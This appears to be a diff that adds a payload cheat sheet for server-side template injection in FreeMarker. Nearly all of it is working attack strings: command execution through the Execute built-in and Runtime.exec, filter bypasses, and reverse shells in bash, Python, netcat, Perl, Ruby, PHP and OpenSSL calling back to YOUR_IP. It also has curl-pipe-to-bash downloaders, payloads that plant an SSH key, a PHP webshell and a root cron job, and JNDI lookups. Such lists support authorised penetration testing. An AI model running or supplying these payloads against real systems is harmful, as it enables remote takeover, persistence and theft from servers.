@@ -1,0 +1,158 @@
+Command Execution Tests
+
+# Using Execute built-in
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Using Runtime.exec()
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('id').waitFor()}
+
+# Using ProcessBuilder
+${T(java.lang.ProcessBuilder).start(['id'])}
+${T(java.lang.ProcessBuilder).start(['/bin/sh','-c','id'])}
+
+# Using ProcessBuilder with output
+${T(java.lang.ProcessBuilder).start(['id']).inputStream.readAllBytes()?join(" ")}
+
+# Using getRuntime with output
+${T(java.lang.Runtime).getRuntime().exec('id').inputStream.readAllBytes()?join(" ")}
+
+# Using IOUtils (if available)
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+Bypass Filters
+
+# Bypass parentheses filter with j_string
+${['"' + '"'?j_string[0] + 'x28"'][0]?eval}  # Creates '('
+${['"' + '"'?j_string[0] + 'x29"'][0]?eval}  # Creates ')'
+
+# Construct command with bypass
+${["'freemarker.template.utility.Execute'?new" +
+    ['"' + '"'?j_string[0] + 'x28"'][0]?eval +
+    ")" +
+    ['"' + '"'?j_string[0] + 'x28"'][0]?eval +
+    '"/bin/sh -c id")'
+][0]?eval}
+
+
+Outbound Connectivity Tests
+Set up python or NC server
+
+# HTTP callback
+${"freemarker.template.utility.Execute"?new()("curl http://YOUR_IP:8000/test")}
+${"freemarker.template.utility.Execute"?new()("wget http://YOUR_IP:8000/test -O /dev/null")}
+${"freemarker.template.utility.Execute"?new()("ping -c 1 YOUR_IP")}
+
+# DNS callback
+${"freemarker.template.utility.Execute"?new()("nslookup YOUR_IP")}
+
+Reverse Shells
+
+
+Bash Reverse Shells
+
+# Bash with /dev/tcp
+${"freemarker.template.utility.Execute"?new()("bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1")}
+
+# Bash with exec
+${"freemarker.template.utility.Execute"?new()("exec 5<>/dev/tcp/YOUR_IP/PORT;cat <&5|while read line;do $line 2>&5 >&5;done")}
+
+
+Base64 Encoded Reverse Shells
+
+# Base64 payload
+${"freemarker.template.utility.Execute"?new()('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | bash')}
+
+# Base64 with sh
+${"freemarker.template.utility.Execute"?new()('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | sh')}
+
+
+Python Reverse Shell (if Python installed)
+
+# Python3 reverse shell
+${"freemarker.template.utility.Execute"?new()('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"')}
+
+# Python2 reverse shell
+${"freemarker.template.utility.Execute"?new()('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"')}
+
+
+Netcat Reverse Shells
+
+# Netcat with -e
+${"freemarker.template.utility.Execute"?new()("nc -e /bin/sh YOUR_IP PORT")}
+
+# Netcat without -e
+${"freemarker.template.utility.Execute"?new()("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f")}
+
+
+Perl Reverse Shell
+
+# Perl reverse shell
+${"freemarker.template.utility.Execute"?new()('perl -e "use Socket;\$i=\"YOUR_IP\";\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}"')}
+
+
+Ruby Reverse Shell
+
+# Ruby reverse shell
+${"freemarker.template.utility.Execute"?new()('ruby -rsocket -e "exit if fork;c=TCPSocket.new(\"YOUR_IP\",PORT);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"')}
+
+
+PHP Reverse Shell (if PHP installed)
+
+# PHP reverse shell
+${"freemarker.template.utility.Execute"?new()('php -r "\$sock=fsockopen(\"YOUR_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");"')}
+
+
+OpenSSL Reverse Shell
+
+# OpenSSL reverse shell
+${"freemarker.template.utility.Execute"?new()('mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect YOUR_IP:PORT > /tmp/s; rm /tmp/s')}
+
+
+Fetch and Execute
+
+# Download and run script
+${"freemarker.template.utility.Execute"?new()("curl http://YOUR_IP:8000/shell.sh | bash")}
+${"freemarker.template.utility.Execute"?new()("wget http://YOUR_IP:8000/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh")}
+
+# Download binary
+${"freemarker.template.utility.Execute"?new()("curl http://YOUR_IP:8000/nc -o /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/sh YOUR_IP PORT")}
+
+
+Java Native Reverse Shell
+
+# Java reverse shell using Runtime.exec()
+${T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"})}
+
+# Java reverse shell with ProcessBuilder
+${T(java.lang.ProcessBuilder).start(["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"])}
+
+
+File Write Payloads
+
+# Write SSH key
+${"freemarker.template.utility.Execute"?new()('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /root/.ssh/authorized_keys')}
+
+# Write webshell
+${"freemarker.template.utility.Execute"?new()('echo "<?php system(\$_GET[\'cmd\']); ?>" > /var/www/html/shell.php')}
+
+# Write file using Java
+${T(java.nio.file.Files).write(T(java.nio.file.Paths).get('/tmp/shell.sh'), 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'.getBytes())}
+
+# Write cron job
+${"freemarker.template.utility.Execute"?new()('echo "* * * * * root bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1" >> /etc/crontab')}
+
+
+Blind/Time-Based Payloads
+
+# Time-based test
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+
+# Conditional time-based
+${(T(java.lang.Runtime).getRuntime().exec('id').waitFor() == 0)?then('sleep 5','')}
+
+JNDI/LDAP Payloads (for Java deserialization)
+
+# JNDI injection (if vulnerable)
+${T(javax.naming.InitialContext).doLookup('ldap://YOUR_IP:1389/Exploit')}
+${T(javax.naming.InitialContext).doLookup('rmi://YOUR_IP:1099/Exploit')}
